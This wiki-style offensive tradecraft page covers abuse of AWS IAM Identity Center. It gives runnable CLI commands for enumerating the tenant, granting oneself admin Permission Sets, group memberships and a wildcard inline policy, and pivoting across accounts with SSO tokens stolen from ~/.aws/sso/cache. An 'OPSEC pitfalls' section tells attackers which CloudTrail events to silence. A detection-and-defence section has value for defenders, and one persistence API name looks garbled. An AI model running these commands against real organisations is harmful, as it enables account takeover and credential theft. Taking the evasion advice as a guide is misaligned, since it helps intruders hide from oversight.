---
title: AWS IAM Identity Center — internal abuse paths
slug: aws-iam-identity-center-internal-abuse
---

> **TL;DR:** AWS IAM Identity Center (formerly AWS SSO) is the modern SSO front-door for AWS Organizations. After initial access, attackers escalate via permission-set assignment, account-discovery via the Identity Store, group manipulation, and access-portal session-cookie theft for cross-account pivot without re-authenticating.

## What it is
IAM Identity Center sits in the **management account** of an AWS Organization (or a delegated administrator member) and federates users into every member account via Permission Sets — IAM roles auto-created in each target account with names like `AWSReservedSSO_AdminAccess_<hash>`. Users authenticate at `https://<tenant>.awsapps.com/start` and receive short-lived (1–12h) credentials per account-role pair.

## Preconditions / where it applies
- Foothold in the management account OR in the delegated Identity Center admin account
- Or compromise of an Identity Store user / group with `sso:CreateAccountAssignment` / `identitystore:UpdateGroup` permissions
- Externally-facing access-portal URL (always `https://<id>.awsapps.com/start#/`) reachable from victim

## Tradecraft

**Enumerate the tenant from any authenticated session:**

```bash
aws sso-admin list-instances
# Returns InstanceArn + IdentityStoreId
aws sso-admin list-permission-sets --instance-arn $ARN
aws sso-admin list-accounts-for-provisioned-permission-set \
  --instance-arn $ARN --permission-set-arn $PS
aws identitystore list-users --identity-store-id $IDS
aws identitystore list-groups --identity-store-id $IDS
```

**Privilege escalation #1 — assign yourself a privileged Permission Set:**

```bash
# Needs sso:CreateAccountAssignment + iam:AttachRolePolicy in target acct
aws sso-admin create-account-assignment \
  --instance-arn $ARN \
  --target-id 111122223333 \
  --target-type AWS_ACCOUNT \
  --permission-set-arn $ADMIN_PS \
  --principal-type USER \
  --principal-id $MY_USER_ID
```

**Privilege escalation #2 — modify the Permission Set's inline policy:**

```bash
aws sso-admin put-inline-policy-to-permission-set \
  --instance-arn $ARN \
  --permission-set-arn $PS \
  --inline-policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
aws sso-admin provision-permission-set --instance-arn $ARN --permission-set-arn $PS \
  --target-id 111122223333 --target-type AWS_ACCOUNT
```

Permission Set updates propagate to every account it's assigned to within minutes.

**Privilege escalation #3 — add yourself to a privileged group in the Identity Store:**

```bash
aws identitystore create-group-membership \
  --identity-store-id $IDS \
  --group-id $ADMIN_GROUP \
  --member-id UserId=$MY_USER_ID
```

**Cross-account pivot via STS:**

```bash
# Get short-lived creds for any assigned (account, permission-set) pair
aws sso get-role-credentials --access-token $TOKEN \
  --role-name AWSAdministratorAccess --account-id 444455556666
```

`$TOKEN` is the access portal's SSO access token cached at `~/.aws/sso/cache/<hash>.json` (8-hour lifetime). Stealing this file from a developer's workstation gives the attacker every account that developer can SSO into — no MFA prompt, no audit on the user's home tenant.

**Persistence: external IdP swap.** If IdP (Okta, Entra) is the upstream, attackers compromising the IdP can register a backup IdP via `iam-identity-center-application-set-application-assignment-configuration`. AWS treats new external IdP federation as legitimate user creation — visible only in CloudTrail `CreateExternalIdpConfigurationForDirectory`.

**Trusted Identity Propagation (TIP) abuse — newer:** TIP lets the SSO identity flow into Redshift / Lake Formation / Q. A token-exchange call (`sso-oidc:CreateTokenWithIAM`) gets an IAM session bearing the user's identity claim — attackers harvesting a TIP token bypass per-service auth.

## Detection and defence
- CloudTrail in the management account: alert on `CreateAccountAssignment`, `PutInlinePolicyToPermissionSet`, `CreatePermissionSet`, `UpdateGroupMembership` outside change windows
- Identity Store events appear under `sso-directory.amazonaws.com` — easy to overlook in detections that filter to common services
- SCP at the OU root denying `iam:CreateRole` against `AWSReservedSSO_*` from non-Identity-Center principals
- Set Permission Set session duration ≤1h for production; 12h is convenient but extends stolen-token window
- Monitor `~/.aws/sso/cache/` exfiltration — endpoint DLP rule on this path

## OPSEC pitfalls
- `aws sso-admin list-instances` returns InstanceArn instantly; service control policies cannot deny `sso-admin:List*` to the management account directly
- Permission Set provisioning is async; CloudTrail shows `ProvisionPermissionSet` separate from `CreateAccountAssignment` — both must be silenced or both will fire
- Identity Store changes are NOT in the same CloudTrail stream as IAM — defenders frequently forget to ingest `sso-directory.amazonaws.com` events

## References
- [IAM Identity Center user guide](https://docs.aws.amazon.com/singlesignon/latest/userguide/)
- [Datadog — IAM Identity Center attack paths](https://securitylabs.datadoghq.com/) — escalation primitives
- [AWS Trusted Identity Propagation](https://docs.aws.amazon.com/singlesignon/latest/userguide/trustedidentitypropagation.html)
- [Permiso — SSO access token theft](https://permiso.io/blog/)

See also: [[aws-sso-device-code-phishing]], [[aws-iam-enum]], [[aws-organisations-abuse]], [[aws-assumerole-chains]], [[aws-cross-account]], [[cloud-iam-misconfig-patterns]], [[okta-attacks]], [[token-stealing-cloud]]
